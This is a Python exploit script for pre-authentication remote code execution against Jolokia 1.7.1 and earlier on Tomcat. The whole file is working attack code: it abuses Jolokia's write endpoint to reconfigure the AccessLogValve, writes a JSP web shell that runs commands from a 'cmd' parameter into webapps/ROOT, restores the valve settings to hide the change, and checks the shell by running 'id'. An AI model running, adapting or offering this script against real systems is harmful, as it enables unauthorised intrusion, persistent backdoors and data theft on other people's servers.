import json
import requests
import sys
import time

from random import randint


SLEEP = 10


def usage():
    # Display the banner if arguments are not correctly set
    banner = """NAME: Jolokia <= 1.7.1, RCE (pre-auth)
SYNOPSIS: python3 rce_1.7.1.py <BASE_URL>
DESCRIPTION:
    Exploit Jolokia under 1.7.1 (October 2021)
EXAMPLE: python3 rce_1.7.1.py http://127.0.0.1:8080/jolokia
AUTHOR: coiffeur
    """
    print(banner)


def extract(raw, start_delimiter, end_delimiter):
    start = raw.find(start_delimiter)
    if start == -1:
        print("[x] Not found!")
        exit(-1)
    else:
        start = start + len(start_delimiter)
        end = start + raw[start::].find(end_delimiter)
        data = raw[start:end]
        if str(type(data)) == "<class 'bytes'>":
            print(f"[+] Found: {data.decode()}")
        else:
            print(f"[+] Found: {data}")
    return data


class Attack:
    path = "Catalina:host=localhost,name=AccessLogValve,type=Valve"
    config = {
        "pattern": " ",
        "checkExists": "true",
        "fileDateFormat": f"_{randint(1000,9999)}",
        "prefix": f"{randint(1000,9999)}",
        "suffix": ".jsp",
        "directory": "webapps/ROOT",
        "buffered": "false",
        "asyncSupported": "false",
    }
    delimiter = "IVOIRE"
    cmd = "id"

    def __init__(self, url):
        self.base_url = url

    def backup(self):
        print("[*] Looking for valve configuration.")
        url = f"{self.base_url}/read/{self.path}" 
        r = requests.get(url, verify=False)
        result = json.loads(r.text)
        if result["value"]["rotatable"] != None:
            print("[*] Valve's configuration found.")
            self.backup = result["value"]
            print("[*] Configuration's backup done.")
            return 1
        print("[!] Valve's configuration not found.")
        print("[x] Exploit failed!")
        exit(-1)
    
    def restore(self):
        print("[*] Restoring valve's configuration.")
        for key in self.backup:
            if key != "pattern":
                value = self.backup[key]
                if value == True:
                    value = "true"
                elif value == False:
                    value = "false"
                elif value == None:
                    value = ""
                if value.find("/") != -1:
                    value = value.replace("/", "!/")
                url = f"{self.base_url}/write/{self.path}/{key}/{value}"
                r = requests.get(url, verify=False)
        url = f"{self.base_url}/write/{self.path}/pattern/{self.backup['pattern']}"
        r = requests.get(url, verify=False)
        url = f"{self.base_url}/read/{self.path}" 
        r = requests.get(url, verify=False)
        result = json.loads(r.text)
        if result["value"] == self.backup:
            print("[*] Valve's configuration restored.")
            return 1
        print("[!] Valve's configuration restoration failed.")
        return 0

    def check(self):
        url = f"{self.base_url.replace('/jolokia', '/')}{self.config['prefix']}{self.config['fileDateFormat']}{self.config['suffix']}?cmd={self.cmd}"
        print(f"[*] Webshell's URL: {url}")
        r = requests.get(url, verify=False)
        if r.status_code == 200:
            if r.text.find("uid") != -1:
                extract(r.text, self.delimiter, self.delimiter)
                return 1
        else:
            print("[!] Webshell unreachable.")
        return 0

    def run(self):
        self.backup()

        print("[*] Poisoning valve's configuration.")
        for key in self.config:
            value = self.config[key]
            if value.find("/") != -1:
                value = value.replace("/", "!/")
            url = f"{self.base_url}/write/{self.path}/{key}/{value}"
            r = requests.get(url, verify=False)

        print(f"[...] Waiting ({SLEEP}s) for valve's configuration update.")
        time.sleep(SLEEP)

        print("[*] Writting webshell.")
        pattern = self.delimiter + "<%{%}t= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"RESULT\").next() %{%}t>" + self.delimiter
        url = f"{self.base_url}/write/{self.path}/pattern/{pattern}"
        r = requests.get(url, verify=False)
        url = f"{self.base_url}/write/{self.path}/pattern/{self.config['pattern']}"
        r = requests.get(url, verify=False)

        print(f"[...] Waiting ({SLEEP/2}s) for valve's configuration update.")
        time.sleep(SLEEP/2)

        print("[*] Cleaning valve's configuration.")
        url = f"{self.base_url}/write/{self.path}/prefix/{self.backup['prefix']}"
        r = requests.get(url, verify=False)
        url = f"{self.base_url}/write/{self.path}/suffix/{self.backup['suffix']}"
        r = requests.get(url, verify=False)
        url = f"{self.base_url}/write/{self.path}/directory/{self.backup['directory']}"
        r = requests.get(url, verify=False)
        url = f"{self.base_url}/write/{self.path}/fileDateFormat/{self.backup['fileDateFormat']}"
        r = requests.get(url, verify=False)

        print(f"[...] Waiting ({SLEEP/2}s) for valve's configuration update.")
        time.sleep(SLEEP/2)
        
        self.restore()
        
        if self.check():
            print("[+] Exploit succeed.")
            exit(1)
        print("[x] Exploit failed!")
        exit(-1)


def main(base_url):
    a = Attack(base_url)
    a.run()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
        exit(-1)
    main(sys.argv[1])